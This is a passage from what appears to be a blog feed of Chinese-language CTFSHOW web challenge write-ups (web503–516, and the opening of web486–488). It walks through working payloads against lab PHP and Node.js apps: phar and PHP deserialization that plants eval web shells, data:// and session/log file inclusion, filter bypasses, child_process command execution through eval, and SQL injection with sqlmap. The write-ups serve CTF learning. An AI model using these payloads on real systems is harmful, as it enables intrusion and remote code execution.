class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后当前目录会生成一个<code>a.phar</code>文件，修改文件后缀名为png，然后上传到系统配置那里</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921165428098.png"></p><p>右键图像复制图像链接，例如我这边是<code>/img/32d3ca5e23f4ccf1e4c8660c40e75f33.png</code>，接着我们要借用<code>file_exists</code>来触发phar反序列化，如图所示发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre=phar:///var/www/html/img/32d3ca5e23f4ccf1e4c8660c40e75f33&amp;db_format=.png</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250921165813237.png"></p><p>最后再蚁剑连接即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921170037602.png"></p><p>根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250921170112087.png"></p><h3 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h3><p>这次发现这里多了模板添加功能，但是查看不了源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922111222469.png"></p><p>可以上传文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922111506445.png"></p><p>参考我们之前做的web499，可以尝试写序列化代码到<code>config/settings</code>，等网页加载时会进行反序列化然后生成木马</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;dbLog&quot;:3:&#123;s:3:&quot;sql&quot;;N;s:7:&quot;content&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:3:&quot;log&quot;;s:5:&quot;2.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>然后进行上传，如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922112040039.png"></p><p>这时点击系统配置功能处，可以看到内容已经写入，并覆盖了原来的内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922112102976.png"></p><p>蚁剑连接<code>2.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250922112222128.png"></p><p>根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922112258650.png"></p><h3 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h3><p>这次文件上传不了，应该是后端做了校验</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922113022825.png"></p><p>但是发现多了一个文件查看功能，可以查看文件源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922113648855.png"></p><p>我们看看<code>api/admin_templates.php</code>源码，可以看到把<code>settings</code>过滤了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922113800382.png"></p><p>在文件查看功能处查看源码，找到<code>api/admin_file_view.php</code>，我们看看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922113949545.png"></p><p>关键源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br></pre></td></tr></table></figure><p>可以看到当满足<code>$debug==1</code>且<code>$f</code>以user开头，就用<code>include</code>进行文件包含。我们可以用data伪协议来做，然后发送内容到<code>api/admin_file_view.php</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>结果如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922115920248.png"></p><h3 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h3><p>这题的<code>api/admin_file_view.php</code>相比上题，多了一个判断文件名后缀的代码，取 <code>$f</code> 文件名的最后三个字符，如果扩展名是 <code>php</code>、<code>sml</code> 或 <code>phar</code>（不区分大小写），则直接返回提示、终止流程</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922121113046.png"></p><p>不过不影响，我们用的是data伪协议，步骤跟上题一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922121329314.png"></p><h3 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h3><p><code>api/admin_file_view.php</code>没变，继续用上题方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=data://text/plain,user&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922133320354.png"></p><h3 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h3><p>这次把伪协议禁了，不能直接写伪协议，不过我们可以换个方法，用一个文件来当中转站执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922144733981.png"></p><p>在系统配置那里可以看到有个网站Logo上传，可以用这个当中转站</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922144933602.png"></p><p>随便上传一张图片，抓包，然后修改内容为<code>user&lt;?php system(&#39;cat /f*&#39;);?&gt;</code>，重新发包</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922145710932.png"></p><p>然后回到网页，右键复制图像链接，发送POST请求到<code>api/admin_file_view.php</code>，如图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922145910491.png"></p><h3 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h3><p>这次<code>api/admin_upload.php</code>会对文件内容进行校验</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922150804490.png"></p><p>用短回显标签和反引号绕过即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&lt;?=`cat /f*`?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922151309377.png"></p><p>右键复制图像链接，发送POST请求到<code>api/admin_file_view.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922151431080.png"></p><h3 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h3><p>这次文件上传限制很严格，换个方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922152524400.png"></p><p>通过分析，发现个人信息修改处存在漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922154404263.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250922154450137.png"></p><p>我们看看<code>api/admin_edit.php</code>对应的源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922154859401.png"></p><p>回到个人信息处查看源码，显示昵称对应的就是<code>nickname</code>，那我们可以用session文件包含来做这题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922154932073.png"></p><p>看看对应的session文件，在cookie复制<code>PHPSESSID</code>的值，然后拼接访问，如图</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922155258768.png"></p><p>刚好前面有个user，符合<code>api/admin_file_view.php</code>的要求，我们在名称修改处传入一句话木马，然后进行文件包含即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922155621775.png"></p><p>剩余的步骤跟之前一样，发送POST请求到<code>api/admin_file_view.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=1&amp;f=/tmp/sess_k9u1ni1spqatv8uvt3acr416o6&amp;1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922160203494.png"></p><h3 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h3><p>这次把sess也过滤了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922193901284.png"></p><p>一个个分析其他代码，发现<code>render/render_class.php</code>有个<code>eval</code>函数</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922202720061.png"></p><p>我们看看能不能利用，也是同一个文件，在上面可以看到<code>shade</code>函数调用了<code>checkVar</code>，然后<code>render</code>函数调用了<code>shade</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250922204215712.png"></p><p>后面在<code>index.php</code>发现调用了<code>render</code>，GET传入<code>?action=view&amp;page=1</code>即可，关键是<code>$user</code>如何控制，且要求是个数组</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922204331037.png"></p><p>继续分析，发现<code>api/admin_edit.php</code>可以控制user数组，那我们只要nickname传入要执行的命令，然后修改前面的模板占位符为<code>&#123;&#123;var:nickname&#125;&#125;</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922204605304.png"></p><p>修改nickname执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922205034121.png"></p><p>然后打开新增模板功能，名称写<code>1.sml</code>，因为后面我们要GET传入<code>?action=view&amp;page=1</code>，要跟page对应，然后内容写<code>1&#123;&#123;var:nickname&#125;&#125;</code>，用于模板渲染。</p><p>加个1是因为<code>render/render_class.php</code>中<code>if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;</code>这里有问题，如果是在开头匹配到的话会返回下标0，然后<code>if(0)</code>就不会进入语句块，也就无法执行eval，正确写法应该是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br></pre></td></tr></table></figure><p>回归正题，我们传入内容如图所示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922210955246.png"></p><p>然后访问<code>index.php?action=view&amp;page=1</code>触发漏洞即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922211027918.png"></p><h3 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h3><p>这次<code>render/render_class.php</code>对<code>$value</code>过滤很严格，字符可以用字符串拼接绕过，然后因为括号()用不了，我们用include来包含文件，include是可以不用括号包裹直接用的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922214209598.png"></p><p>因为网站的php版本为5.6，且正则没有过滤花括号，可以用<code>$_POST&#123;1&#125;</code>来代替<code>$_POST[1]</code>，旧版 PHP 允许使用花括号 <code>&#123;&#125;</code> 访问数组某个键，比如 <code>$_POST&#123;1&#125;</code>，这是 PHP 早期版本的语法，但从 PHP 7.4 开始，花括号访问数组的语法被废弃并在 PHP 8.0 中移除</p><p><img src="https://oss.waynejoons.icu/picphoto/20250922215057626.png"></p><p>那我们要写入的命令为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上看别的师傅有一个很牛的方法，可以用heredoc语法来定义长字符串，它允许开发者定义多行字符串而不需要使用引号，也不用为引号、换行符等转义，非常方便地写包含多行HTML、SQL、代码片段等内容的字符串，格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$变量名 = &lt;&lt;&lt;标识符</span><br><span class="line">多行字符串内容</span><br><span class="line">标识符;</span><br></pre></td></tr></table></figure><p><code>&lt;&lt;&lt;</code> 是heredoc开始的标记，后面跟一个自定义的标识符，直到文件中某一行独立写着完全相同的结束标识符就结束，结束标识符后必须加分号<code>;</code>结束</p><p>这里要用到之前的反序列化知识，具体可以回顾web493</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;nickname=1;</span><br><span class="line">$a=&lt;&lt;&lt;ctf</span><br><span class="line">&lt;?php includ</span><br><span class="line">ctf;</span><br><span class="line">$b=&lt;&lt;&lt;ctf</span><br><span class="line">e $</span><br><span class="line">ctf;</span><br><span class="line">$c=&lt;&lt;&lt;ctf</span><br><span class="line">_POS</span><br><span class="line">ctf;</span><br><span class="line">$d=&lt;&lt;&lt;ctf</span><br><span class="line">T&#123;1&#125;;?&gt;</span><br><span class="line">ctf;</span><br><span class="line">$n=&lt;&lt;&lt;ctf</span><br><span class="line">1.php</span><br><span class="line">ctf;</span><br><span class="line">$e=clone $db;</span><br><span class="line">$e-&gt;log-&gt;log=$n;</span><br><span class="line">$e-&gt;log-&gt;content=$a.$b.$c.$d;</span><br></pre></td></tr></table></figure><p>POST发包到<code>api/admin_edit.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250922220617214.png"></p><p>然后跟上题一样新增模板，模板在后端渲染后会生成<code>1.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">名称：1.sml</span><br><span class="line">内容：1&#123;&#123;var:nickname&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922220705372.png"></p><p>访问<code>1.php</code>，然后用data伪协议执行命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250922221021079.png"></p><h3 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h3><p>这次过滤更加严格了，那咱们换个方法</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923160424549.png"></p><p>发现下面多了一个<code>checkFoot</code>函数，具体代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line"><span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会读取<code>config/settings</code>的内容进行反序列化，根据前面的题目，对应的文件为<code>api/admin_settings.php</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250923160728891.png"></p><p>也就是会把系统配置功能处的数据存入<code>$config</code>数组，然后<code>$config[&#39;cnzz&#39;]</code>对应的是页面统计</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923160940861.png"></p><p>因为<code>render/render_class.php</code>有个<code>$foot=file_get_contents($foot)</code>，然后再进行include操作，那我们可以在页面统计放入一个文件地址，然后这个文件的内容是另一个文件的地址，这样就可以进行文件包含</p><p>先写一个模板到templates目录下，内容为<code>/var/log/nginx/access.log</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250923162228362.png"></p><p>然后页面统计写<code>/var/www/html/templates/1.sml</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250923162341111.png"></p><p>接着写入模板<code>2.sml</code>，内容为<code>1&#123;&#123;cnzz&#125;&#125;</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250923162519743.png"></p><p>最后访问<code>index.php?action=view&amp;page=2</code>，成功读取到<code>/var/log/nginx/access.log</code>内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923162834910.png"></p><p>然后进行日志文件执行命令即可，UA头写入一句话木马，读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923163127449.png"></p><h3 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h3><p>这次加了过滤，可以用data伪协议来做</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923164548673.png"></p><p>我们传入<code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B</code>，但是如果直接传入是不行的，因为有过滤</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923171114974.png"></p><p><code>preg_match</code>的话我们可以用<strong>数组绕过</strong>，因为<code>preg_match</code>的第二个参数（待匹配内容）必须是字符串，如果传入的是数组，<code>preg_match</code>会返回false而不是报错，如图所示传入</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923173841822.png"></p><p>验证一下，可以看到成功写入了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923173857526.png"></p><p>剩余的步骤跟上题一样，系统配置页面的页面统计写入地址<code>/var/www/html/templates/1.sml</code>，然后新增模板<code>2.sml</code>，内容<code>1&#123;&#123;cnzz&#125;&#125;</code>，最后访问<code>index.php?action=view&amp;page=2</code>执行命令即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923174121881.png"></p><h3 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h3><p>先看代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;我是复读机&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">msg = req.<span class="property">body</span>.<span class="property">user</span>;</span><br><span class="line"><span class="keyword">if</span>((msg.<span class="title function_">match</span>(<span class="regexp">/proto|process|require|exec|var|&#x27;|&quot;|:|\[|\]|[0-9]/</span>))!==<span class="literal">null</span> || msg.<span class="property">length</span>&gt;<span class="number">40</span>)&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;敏感信息不复读&#x27;</span> &#125;);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(msg) &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;我是复读机&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>之前做过类似的题，我们eval嵌套执行就好，GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?a=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;/flag&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>然后body传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=eval(req.query.a)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250923204355810.png"></p><h3 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h3><p>下载附件进行分析，其中关键代码为<code>index.js</code>里面的登录成功后显示处，会执行eval函数</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923213253625.png"></p><p>但是<code>app.js</code>有限制</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923213009750.png"></p><p>不能出现这些字符串，那我们用反引号拼接字符串就可以，还是用上题的代码，修改一下即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)+eval((`req`+`uire(&#x27;child_pro`+`cess&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString()`)</span><br></pre></td></tr></table></figure><p>先进行注册</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923213518460.png"></p><p>再点击<code>sign in</code>登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923213554953.png"></p><p>成功执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250923213614065.png"></p><p>同理，我们修改一下执行命令env，成功找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)+eval((`req`+`uire(&#x27;child_pro`+`cess&#x27;).spawnSync(&#x27;env&#x27;).stdout.toString()`)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250923213754016.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW 中期测评第二部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW 中期测评（一）web486 - web501</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-web486-web501/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-web486-web501/</id>
    <published>2025-09-19T11:09:26.000Z</published>
    <updated>2025-11-10T04:10:44.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h3><p>打开之后发现是个登录框，PATH为<code>/index.php?action=login</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250917164405707.png"></p><p>尝试修改<code>/index.php?action=login</code>为<code>/index.php?action=1</code>，发生报错</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917164527980.png"></p><p>由报错内容可知网站可能存在文件包含漏洞，尝试进行目录穿越读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../flag</span><br></pre></td></tr></table></figure><p>访问源码得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917164756984.png"></p><h3 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h3><p>修改<code>/index.php?action=login</code>为<code>/index.php?action=../index</code>，可以查看源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917174046175.png"></p><p>存在SQL注入漏洞，而且没有过滤，测试后发现没有回显，用时间盲注</p><p>先验证一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=1&amp;password=&#x27;) or sleep(3)--+</span><br></pre></td></tr></table></figure><p>没有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917175010543.png"></p><p>这里用sqlmap去跑结果了，省点时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://39dc9317-0164-419c-ac40-b3d76de931e5.challenge.ctf.show/index.php?action=check&amp;username=1&amp;password=1&quot; --batch -D ctfshow -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250917175155899.png"></p><h3 id="web488"><a href="#web488" class="headerlink" title="web488"></a>web488</h3><p>打开题目之后，也是跟之前一样读取index代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../index</span><br></pre></td></tr></table></figure><p><img 